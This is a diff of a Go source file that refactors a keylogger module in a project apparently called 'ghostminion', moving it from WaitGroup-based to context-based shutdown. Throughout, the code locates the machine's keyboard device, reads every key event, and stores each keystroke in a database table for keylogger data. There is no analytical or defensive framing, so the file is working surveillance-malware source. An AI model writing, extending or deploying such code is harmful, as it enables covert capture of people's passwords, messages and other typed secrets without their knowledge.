@@ -1,83 +1,105 @@
 package apps
 
 import (
+	"context"
 	"ghostminion/db"
 	"ghostminion/db/dbDataTypes"
 	"github.com/MarinX/keylogger"
-	"sync"
 )
 
 type KeyLoggerApp struct {
-	stop      chan struct{}
+	baseApp   *BaseApp
 	eventChan chan string
-	klwg      sync.WaitGroup
 }
 
-func NewKeyLoggerApp() (*KeyLoggerApp, error) {
+func NewKeyLoggerApp(appData AppData) (*KeyLoggerApp, error) {
 	return &KeyLoggerApp{
-		stop:      make(chan struct{}),
-		eventChan: make(chan string, 100),
+		baseApp: &BaseApp{
+			stop:    make(chan struct{}, 1),
+			AppData: &appData,
+		},
+		eventChan: make(chan string, 100), // buffered to decouple producer/consumer
 	}, nil
 }
 
-func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
-	defer wg.Done()
+func (k *KeyLoggerApp) Name() string {
+	return k.baseApp.Name
+}
 
+// Start runs producer/consumer until ctx is canceled
+func (k *KeyLoggerApp) Start(ctx context.Context) error {
+	// find keyboard device
 	keyboard := keylogger.FindKeyboardDevice()
 	if len(keyboard) == 0 {
 		lgr.Warn("No keyboard found, you may need to provide manual input path")
-		return
+		return nil
 	}
 	lgr.Debug("Found keyboard at path: ", keyboard)
 
 	kl, err := keylogger.New(keyboard)
 	if err != nil {
-		lgr.Error("Error creating keylogger instance: ", err)
-		return
+		lgr.Error("Error creating keylogger instance: " + err.Error())
+		return err
 	}
 	defer kl.Close()
 
-	c.klwg.Add(2)
-	go c.startProducer(kl)
-	go c.startConsumer()
-	c.klwg.Wait()
+	// run consumer in goroutine
+	done := make(chan struct{})
+	go func() {
+		defer close(done)
+		k.store(ctx)
+	}()
+
+	// run producer in this goroutine (blocking)
+	k.produce(ctx, kl)
+
+	<-done
+	return nil
 }
 
-func (c *KeyLoggerApp) startProducer(kl *keylogger.KeyLogger) {
-	defer c.klwg.Done()
+// Stop closes channels for cleanup
+func (k *KeyLoggerApp) Stop() error {
+	close(k.eventChan)
+	return nil
+}
+
+// Producer reads events from keylogger and sends them into eventChan
+func (k *KeyLoggerApp) produce(ctx context.Context, kl *keylogger.KeyLogger) {
 	events := kl.Read()
 	for {
 		select {
-		case <-c.stop:
+		case <-ctx.Done():
 			return
 		case e := <-events:
 			if e.Type == keylogger.EvKey {
-				c.eventChan <- e.KeyString()
+				select {
+				case k.eventChan <- e.KeyString(): // block if channel full
+				case <-ctx.Done():
+					return
+				}
 			}
 		}
 	}
 }
 
-func (c *KeyLoggerApp) startConsumer() {
-	defer c.klwg.Done()
+// Consumer reads from eventChan and writes to DB
+func (k *KeyLoggerApp) store(ctx context.Context) {
 	for {
 		select {
-		case <-c.stop:
+		case <-ctx.Done():
 			return
-		case key := <-c.eventChan:
-			err := db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(key))
-			if err != nil {
-				lgr.Error("Error writing keylogger data: ", err)
+		case key, ok := <-k.eventChan:
+			if !ok {
+				return
+			}
+			if err := db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(key)); err != nil {
+				lgr.Error("Error writing keylogger data: " + err.Error())
 			}
 		}
 	}
 }
 
-func (c *KeyLoggerApp) Stop() {
-	close(c.stop)
-	close(c.eventChan)
-}
-
-func (c *KeyLoggerApp) validateParams() error {
+// validateParams placeholder
+func (k *KeyLoggerApp) validateParams() error {
 	return nil
 }
